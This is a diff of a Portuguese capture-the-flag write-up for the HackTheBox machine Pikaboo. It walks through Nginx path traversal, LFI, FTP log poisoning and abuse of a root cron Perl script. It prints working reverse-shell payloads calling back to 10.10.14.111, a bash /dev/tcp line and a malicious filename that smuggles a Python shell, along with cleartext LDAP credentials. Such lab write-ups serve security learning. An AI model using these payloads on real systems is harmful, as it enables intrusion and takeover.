@@ -86,7 +86,7 @@ Após um tempo de pesquisa sobre vulnerabilidades no Nginx, que é nossa porta d
 
 Basicamente podemos nos aproveitar do Nginx mal configurado para obtermos `Path Traversal` ao adicionarmos `../` na URL e conseguirmos enumerar diretórios, vamos tentar.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ gobuster dir -e -u http://pikaboo.htb/admin../ -w /usr/share/wordlists/dirb/common.txt -r                                                                                                                                            1 ⨯
 ===============================================================
@@ -131,7 +131,7 @@ Ao enumerar a página, descobrimos que ao clicar em qualquer link, vemos um par�
 
 Isso nos dá uma dica de que podemos tentar `LFI` através do parâmetro, vamos tentar.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349 
 
@@ -170,7 +170,7 @@ Conseguimos acesso ao log do VSFTPd!!!
 Agora podemos utilizar a técnica de `Log Poisoning` para conseguir um `RCE` e talvez um reverse shell, e de quebra, conseguimos enumerar o user `pwnmeow`.
 Tudo o que precisamos fazer é tentar nos concectar com o FTP, no lugar do username, inserimos um payload em `PHP`, ao enviarmos uma requisição para o log, teremos a execução do payload.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ ftp 10.10.10.249                                            
 Connected to 10.10.10.249.
@@ -188,7 +188,7 @@ Em password, podemos inseir qualquer coisa.
 
 Agora setamos um `netcat` na porta informada no payload e enviamos um curl para o endereço.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
 ```
@@ -196,7 +196,7 @@ Agora setamos um `netcat` na porta informada no payload e enviamos um curl para 
 
 E conseguimos nosso shell!!!
 
-```
+```bash
 www-data@pikaboo:/var/www/html/admin_staging$ cd /home
 cd /home
 www-data@pikaboo:/home$ ls -la
@@ -224,7 +224,7 @@ No diretório `/home` encontramos o usuário pwnmeow que já havimos enumerado n
 
 Durante a enumeração local, descobrimos que o servidor está rodando um `LDAP` na porta 389.
 
-```
+```bash
 www-data@pikaboo:/home/pwnmeow$ netstat -plnt
 netstat -plnt
 Active Internet connections (only servers)
@@ -240,7 +240,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 ```
 Ainda na enumeração local, também descobrimos alguns scripts python no diretório `/opt/pokeapi`.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi$ ls -la
 ls -la
 total 104
@@ -273,7 +273,7 @@ drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
 ```
 Enumerando os scripts e diretórios, encontramos algunas informações em `config/settings.py`.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi/config$ cat settings.py
 cat settings.py
 # Production settings
@@ -400,7 +400,7 @@ REST_FRAMEWORK = {
 ```
 Encontramos as credencias do `LDAP`!!!
 
-```
+```json
 DATABASES = {
     "ldap": {
         "ENGINE": "ldapdb.backends.ldap",
@@ -417,7 +417,7 @@ DATABASES = {
 
 Com as credenciais, podemos enumerar o LDAP com o `ldapsearch`.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -b "dc=pikaboo,dc=htb" -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"                               
 <" -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
 dn: dc=pikaboo,dc=htb
@@ -478,7 +478,7 @@ ou: groups
 ```
 Conseguimos a senha do usuário pwnmeow em `base64`, vamos decriptá-la.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
 _G0tT4_C4tcH_'3m_4lL!_  
@@ -486,7 +486,7 @@ _G0tT4_C4tcH_'3m_4lL!_
 
 Conseguimos a senha do usuário, porém ela não foi aceita na conexão via `SSH`, vamos tentar o `FTP`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ ftp 10.10.10.249
 Connected to 10.10.10.249.
@@ -507,7 +507,7 @@ Porém não encontramos nada de útil, além do diretório `versions` onde temos
 
 Ao enumerar as `crons`, identificamos uma cron feita pelo `root`.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi/config$ cat /etc/crontab
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -542,7 +542,7 @@ file /usr/local/bin/csvupdate_cron
 
 Aparentemente é um script que faz alguma coisa a cada segundo, vamos enumerar o script.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi/config$ cat /usr/local/bin/csvupdate_cron
 cat /usr/local/bin/csvupdate_cron
 #!/bin/bash
@@ -559,7 +559,7 @@ Interpretando o scrpt, podemos identificar que ele abre cada diretório dentro d
 
 Como ele roda outro script, o `/usr/local/bin/csvupdate`, vamos enumerá-lo.
 
-```
+```bash
 www-data@pikaboo:/opt/pokeapi/config$ file /usr/local/bin/csvupdate
 file /usr/local/bin/csvupdate
 /usr/local/bin/csvupdate: Perl script text executable
@@ -804,7 +804,7 @@ O pesquisar sobre vulnerabilidades em scripts Perl, encontrei este [artigo](http
 
 Basicamente ele diz que se o nome do arquivo tiver um pipe `"|"`, o resto do nome do arquivo será executado como um comando, porém, a cron utiliza `basename`, então não podemos executar qualquer payload, se testarmos em nossa máquina local, veremos que o payload simples de reverse shell é cortado pelo basename.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ basename 'bash -c "/bin/bash -i > /dev/tcp/10.10.14.111/8444 0>&1"'
 8444 0>&1"
@@ -815,7 +815,7 @@ O basename vai considerar só o que vem após o último `"/"`, então precisamos
 É possível obter um reverse shell através do `python`, sem utilizar `/`, vamos criar um arquivo para upload.
 
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.111\",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';.csv"
                                                                                                                      
@@ -829,7 +829,7 @@ drwxr-xr-x 36 hastur hastur 4096 Sep 19 15:42  ..
 
 O que precisamos fazer é setar um `netcat` na porta 8444 e enviar nosso arquivo para o diretório versions, que é onde temos permissão de escrita.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Pikaboo]
 └─$ ftp 10.10.10.249
 Connected to 10.10.10.249.
